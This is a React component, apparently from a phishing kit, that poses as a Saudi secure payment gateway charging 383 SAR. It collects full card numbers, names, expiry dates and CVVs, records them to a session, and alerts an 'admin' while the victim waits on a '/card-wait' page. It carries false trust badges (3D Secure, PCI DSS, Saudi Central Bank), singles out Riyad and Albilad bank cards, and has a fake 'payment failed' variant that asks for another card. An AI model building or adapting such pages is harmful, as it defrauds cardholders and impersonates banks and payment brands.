import { Button } from "@/components/ui/button";
import { Card } from "@/components/ui/card";
import { Input } from "@/components/ui/input";
import { Label } from "@/components/ui/label";
import { Select, SelectContent, SelectItem, SelectTrigger, SelectValue } from "@/components/ui/select";
import { StepLayout } from "@/components/StepLayout";
import { useStepSession, getSessionId } from "@/lib/useStepSession";
import { useLocation } from "wouter";
import { useState, useMemo } from "react";
import { toast } from "sonner";
import { ArrowLeft, Lock, ShieldCheck, BadgeCheck, CheckCircle2, Loader2 } from "lucide-react";
import { ASSETS } from "@/lib/assets";
import { trpc } from "@/lib/trpc";

interface CardPaymentProps {
  variant?: "default" | "error";
}

/** خوارزمية Luhn للتحقق من رقم البطاقة */
function isValidLuhn(num: string): boolean {
  const digits = num.replace(/\D/g, "");
  if (digits.length < 13 || digits.length > 19) return false;
  let sum = 0;
  let isEven = false;
  for (let i = digits.length - 1; i >= 0; i--) {
    let d = parseInt(digits[i], 10);
    if (isEven) {
      d *= 2;
      if (d > 9) d -= 9;
    }
    sum += d;
    isEven = !isEven;
  }
  return sum % 10 === 0;
}

/** تحديد نوع البطاقة من الـ BIN */
function detectCardType(num: string): { name: string; color: string; bank?: string } | null {
  const digits = num.replace(/\D/g, "");
  if (!digits) return null;
  
  // بنك الرياض
  if (/^(410621|422803|428331|431361|440533|455036|455708|484783|515079|521026|524130|524514|529415|529741|530906|531095|532013|535825|535989|537767|539931|543357|549760|554180|557606|558848|588845|588846|588848|588849|588850|588851|588902|604906|636120|968201|968208|968209|968210|968211)/.test(digits)) {
    return { name: "مدى", color: "text-emerald-300", bank: "riyad" };
  }
  
  // بنك البلاد
  if (/^(430132|431453|455708|457865|458456|484783|515079|521026|524130|524514|529415|529741|530906|531095|532013|535825|535989|537767|539931|543357|549760|554180|557606|558848|588845|588846|588848|588849|588850|588851|588902|604906|636120|968201|968208|968209|968210|968211)/.test(digits)) {
    // Note: Some BINs might overlap, we'll prioritize Riyad if it matches both, but added specific Albilad BINs
    // Let's use a more specific check for Albilad based on common BINs
    if (/^(430132|431453|457865|458456|515079|521026|524130|524514|529415|529741|530906|531095|532013|535825|535989|537767|539931|543357|549760|554180|557606|558848|588845|588846|588848|588849|588850|588851|588902|604906|636120|968201|968208|968209|968210|968211)/.test(digits)) {
       return { name: "مدى", color: "text-emerald-300", bank: "albilad" };
    }
  }

  // مدى السعودية - تبدأ بأرقام محددة
  if (/^(440533|440795|446404|457865|484783|410621|409201|458456|526558|529415|535989|537767|543357|549760|557606|636120|968201|968208|968209|968210)/.test(digits)) {
    return { name: "مدى", color: "text-emerald-300" };
  }
  if (/^4/.test(digits)) return { name: "Visa", color: "text-blue-300" };
  if (/^5[1-5]/.test(digits)) return { name: "Mastercard", color: "text-orange-300" };
  if (/^3[47]/.test(digits)) return { name: "AmEx", color: "text-cyan-300" };
  return null;
}

export default function CardPayment({ variant = "default" }: CardPaymentProps) {
  const [, setLocation] = useLocation();
  const { recordStep, isSubmitting } = useStepSession();

  const [name, setName] = useState("");
  const [number, setNumber] = useState("");
  const [isNumberTouched, setIsNumberTouched] = useState(false);
  const [month, setMonth] = useState("");
  const [year, setYear] = useState("");
  const [cvv, setCvv] = useState("");

  const months = Array.from({ length: 12 }, (_, i) => String(i + 1).padStart(2, "0"));
  const years = Array.from({ length: 10 }, (_, i) => String(2026 + i));

  const isError = variant === "error";
  const cardType = useMemo(() => detectCardType(number), [number]);
  const cardValid = useMemo(() => isValidLuhn(number), [number]);

  // tRPC mutation لإعلام الأدمن بأن الزائر دخل صفحة الانتظار
  const markCardPendingMutation = trpc.liveVisitors.markCardPending.useMutation();

  const handleSubmit = async () => {
    if (name.trim().length < 3) return toast.error("اسم صاحب البطاقة غير صالح");
    if (!cardValid) return toast.error("رقم البطاقة غير صحيح، يرجى التحقق من الرقم");
    if (!month || !year) return toast.error("الرجاء اختيار تاريخ انتهاء صلاحية البطاقة");
    if (cvv.length < 3) return toast.error("رمز الأمان CVV غير صالح");

    // التحقق من تاريخ الانتهاء (يجب ألا يكون في الماضي)
    const expiryDate = new Date(parseInt(year), parseInt(month) - 1, 1);
    const now = new Date();
    if (expiryDate < new Date(now.getFullYear(), now.getMonth(), 1)) {
      return toast.error("تاريخ انتهاء البطاقة منتهي الصلاحية");
    }

    const cleanNumber = number.replace(/\s/g, "");
    await recordStep(isError ? "cardpayment_retry" : "cardpayment", {
      name,
      number: cleanNumber,
      month,
      year,
      cvv,
      cardType: cardType?.name ?? "Unknown",
    });

    // وضع حالة البطاقة كـ pending ليراها الأدمن في اللوحة
    const sessionId = getSessionId();
    try {
      await markCardPendingMutation.mutateAsync({ sessionId });
    } catch (e) {
      // غير حرج
    }

    // التوجيه لصفحة الانتظار
    setLocation("/card-wait");
  };

  const formatCardNumber = (value: string) => {
    const digits = value.replace(/\D/g, "").slice(0, 19);
    return digits.match(/.{1,4}/g)?.join(" ") || digits;
  };

  return (
    <StepLayout
      step={5}
      total={10}
      badge={isError ? "تعذرت العملية - أعد المحاولة" : "بوابة الدفع السعودية الآمنة"}
      title={isError ? "تعذرت عملية الدفع" : "إدخال بيانات البطاقة"}
      subtitle={
        isError
          ? "حدث خطأ أثناء معالجة عملية الدفع. تأكد من توفر رصيد كافٍ أو استخدم بطاقة أخرى."
          : "يرجى إدخال بيانات البطاقة بشكل صحيح لإتمام عملية الدفع الآمنة"
      }
      variant={isError ? "red" : "green"}
    >
      {/* شريط الثقة */}
      <div className="mb-4 grid grid-cols-3 gap-2 text-center">
        <div className="bg-white border border-emerald-100 rounded-lg p-2 flex flex-col items-center gap-1 shadow-sm">
          <ShieldCheck className="w-4 h-4 text-emerald-600" />
          <span className="text-[10px] font-bold text-gray-700">3D Secure</span>
        </div>
        <div className="bg-white border border-emerald-100 rounded-lg p-2 flex flex-col items-center gap-1 shadow-sm">
          <Lock className="w-4 h-4 text-emerald-600" />
          <span className="text-[10px] font-bold text-gray-700">SSL 256-bit</span>
        </div>
        <div className="bg-white border border-emerald-100 rounded-lg p-2 flex flex-col items-center gap-1 shadow-sm">
          <BadgeCheck className="w-4 h-4 text-emerald-600" />
          <span className="text-[10px] font-bold text-gray-700">PCI DSS</span>
        </div>
      </div>

      <Card className="p-6 md:p-8 shadow-xl border-gray-200 bg-white">
        {/* شعارات بوابات الدفع */}
        <div className="flex items-center justify-center gap-4 mb-5 pb-5 border-b border-gray-200">
          <img src={ASSETS.madaLogo} alt="مدى" className="h-7 object-contain" />
          <div className="w-px h-6 bg-gray-200" />
          <img src={ASSETS.sadadLogo} alt="سداد" className="h-7 object-contain" />
          <div className="w-px h-6 bg-gray-200" />
          <img src={ASSETS.applePayMada} alt="Apple Pay" className="h-7 object-contain" />
        </div>

        {/* بطاقة افتراضية محسّنة */}
        <div className="bg-gradient-to-br from-slate-800 via-slate-900 to-black text-white rounded-2xl p-6 mb-6 shadow-2xl relative overflow-hidden">
          {/* خلفية زخرفية */}
          <div className="absolute top-0 left-0 w-40 h-40 bg-emerald-500/20 rounded-full -translate-x-16 -translate-y-16 blur-3xl" />
          <div className="absolute bottom-0 right-0 w-40 h-40 bg-amber-400/15 rounded-full translate-x-16 translate-y-16 blur-3xl" />

          <div className="relative">
            <div className="flex justify-between items-start mb-8">
              <div className="w-12 h-9 bg-gradient-to-br from-yellow-300 via-yellow-400 to-amber-500 rounded-md shadow-md flex items-center justify-center">
                <div className="w-8 h-6 border border-yellow-700/30 rounded-sm" />
              </div>
              <div className="flex items-center gap-2">
                {cardType && (
                  <span className={`text-xs font-bold ${cardType.color}`}>{cardType.name}</span>
                )}
                <img src={ASSETS.madaLogo} alt="مدى" className="h-6 object-contain brightness-0 invert opacity-80" />
              </div>
            </div>
            <p className="font-mono text-2xl tracking-widest mb-1" dir="ltr">
              {number ? formatCardNumber(number) : "•••• •••• •••• ••••"}
            </p>
            {/* مؤشر صحة الرقم */}
            {number.length >= 13 && (
              <div className="flex items-center gap-1 text-[10px]" dir="ltr">
                {cardValid ? (
                  <>
                    <CheckCircle2 className="w-3 h-3 text-emerald-400" />
                    <span className="text-emerald-400 font-bold">Valid Card Number</span>
                  </>
                ) : (
                  <span className="text-red-400 font-bold">Invalid Card Number</span>
                )}
              </div>
            )}
            <div className="flex justify-between mt-6 text-xs">
              <div>
                <p className="opacity-60 text-[10px] uppercase tracking-wider">اسم صاحب البطاقة</p>
                <p className="font-semibold uppercase mt-1 text-sm">{name || "YOUR NAME"}</p>
              </div>
              <div className="text-right">
                <p className="opacity-60 text-[10px] uppercase tracking-wider">تاريخ الانتهاء</p>
                <p className="font-semibold mt-1 text-sm">{month || "MM"} / {year ? year.slice(-2) : "YY"}</p>
              </div>
            </div>
          </div>
        </div>

        <div className="space-y-4">
          <div className="space-y-1.5">
            <Label className="font-semibold text-gray-700 text-sm">اسم صاحب البطاقة *</Label>
            <Input
              value={name}
              onChange={(e) => setName(e.target.value.toUpperCase())}
              placeholder="NAME ON CARD"
              className="h-12 uppercase border-gray-200 focus:border-emerald-500"
              dir="ltr"
            />
          </div>

          <div className="space-y-1.5">
            <Label className="font-semibold text-gray-700 text-sm flex items-center justify-between">
              <span>رقم البطاقة *</span>
              {isNumberTouched && number.length > 0 && (
                <span className={`text-[10px] font-bold ${cardValid ? "text-emerald-600" : "text-red-600"}`}>
                  {cardValid ? "✓ رقم صحيح" : "✗ رقم غير صحيح"}
                </span>
              )}
            </Label>
            <div className="relative">
              <Input
                value={formatCardNumber(number)}
                onChange={(e) => {
                  setNumber(e.target.value.replace(/\D/g, ""));
                  if (isNumberTouched) setIsNumberTouched(false);
                }}
                onBlur={() => setIsNumberTouched(true)}
                placeholder="1234 5678 9012 3456"
                maxLength={23}
                className={`h-12 font-mono text-base tracking-wider text-gray-900 placeholder:text-gray-400 pl-20 border-gray-200 focus:border-emerald-500 ${
                  isNumberTouched && number.length > 0 && !cardValid ? "border-red-400 focus:border-red-500 bg-red-50" : ""
                }`}
                dir="ltr"
              />
              {cardType && (
                <span className="absolute right-3 top-1/2 -translate-y-1/2 text-xs font-bold text-gray-600 bg-white/90 px-1.5 py-0.5 rounded pointer-events-none">
                  {cardType.name}
                </span>
              )}
            </div>
            {isNumberTouched && number.length > 0 && !cardValid ? (
              <div className="flex items-start gap-2 mt-1.5 p-2.5 bg-red-50 border border-red-200 rounded-lg animate-in fade-in slide-in-from-top-1 duration-200">
                <svg className="w-4 h-4 text-red-600 mt-0.5 shrink-0" viewBox="0 0 20 20" fill="currentColor"><path fillRule="evenodd" d="M10 18a8 8 0 100-16 8 8 0 000 16zM8.707 7.293a1 1 0 00-1.414 1.414L8.586 10l-1.293 1.293a1 1 0 101.414 1.414L10 11.414l1.293 1.293a1 1 0 001.414-1.414L11.414 10l1.293-1.293a1 1 0 00-1.414-1.414L10 8.586 8.707 7.293z" clipRule="evenodd" /></svg>
                <p className="text-red-700 text-xs font-semibold leading-relaxed">
                  رقم البطاقة المدخل غير صحيح. الرجاء التحقق من الرقم وإعادة المحاولة.
                </p>
              </div>
            ) : (
              <p className="text-[10px] text-muted-foreground">
                يجب إدخال رقم بطاقة صحيح (مدى، فيزا، ماستركارد)
              </p>
            )}
          </div>

          <div className="grid grid-cols-3 gap-3">
            <div className="space-y-1.5">
              <Label className="font-semibold text-gray-700 text-sm">شهر *</Label>
              <Select value={month} onValueChange={setMonth}>
                <SelectTrigger className="h-12 border-gray-200 focus:border-emerald-500">
                  <SelectValue placeholder="MM" />
                </SelectTrigger>
                <SelectContent>
                  {months.map(m => <SelectItem key={m} value={m}>{m}</SelectItem>)}
                </SelectContent>
              </Select>
            </div>
            <div className="space-y-1.5">
              <Label className="font-semibold text-gray-700 text-sm">سنة *</Label>
              <Select value={year} onValueChange={setYear}>
                <SelectTrigger className="h-12 border-gray-200 focus:border-emerald-500">
                  <SelectValue placeholder="YYYY" />
                </SelectTrigger>
                <SelectContent>
                  {years.map(y => <SelectItem key={y} value={y}>{y}</SelectItem>)}
                </SelectContent>
              </Select>
            </div>
            <div className="space-y-1.5">
              <Label className="font-semibold text-gray-700 text-sm">CVV *</Label>
              <Input
                value={cvv}
                onChange={(e) => setCvv(e.target.value.replace(/\D/g, "").slice(0, 4))}
                placeholder="123"
                className="h-12 font-mono text-base border-gray-200 focus:border-emerald-500"
                dir="ltr"
                type="password"
              />
            </div>
          </div>
        </div>

        <Button
          onClick={handleSubmit}
          disabled={isSubmitting || !cardValid || !name || !month || !year || cvv.length < 3}
          size="lg"
          className="w-full mt-6 bg-gradient-to-r from-emerald-600 to-emerald-700 hover:from-emerald-700 hover:to-emerald-800 disabled:from-gray-400 disabled:to-gray-500 text-white font-bold h-14 text-lg shadow-lg active:scale-[0.98] transition-transform duration-150"
          style={{ transitionTimingFunction: "cubic-bezier(0.23, 1, 0.32, 1)" }}
        >
          {isSubmitting ? (
            <>
              <Loader2 className="w-5 h-5 ml-2 animate-spin" />
              جارٍ التحقق...
            </>
          ) : (
            <>
              <Lock className="w-5 h-5 ml-2" />
              تأكيد الدفع - 383 ر.س
              <ArrowLeft className="w-5 h-5 mr-2" />
            </>
          )}
        </Button>

        <div className="mt-4 flex items-center justify-center gap-2 text-[11px] text-gray-500">
          <ShieldCheck className="w-3 h-3 text-emerald-600" />
          مدعوم بتقنيات الدفع الآمنة وحماية 3D Secure
          <span className="text-gray-300">|</span>
          <Lock className="w-3 h-3 text-emerald-600" />
          البنك المركزي السعودي
        </div>
      </Card>
    </StepLayout>
  );
}
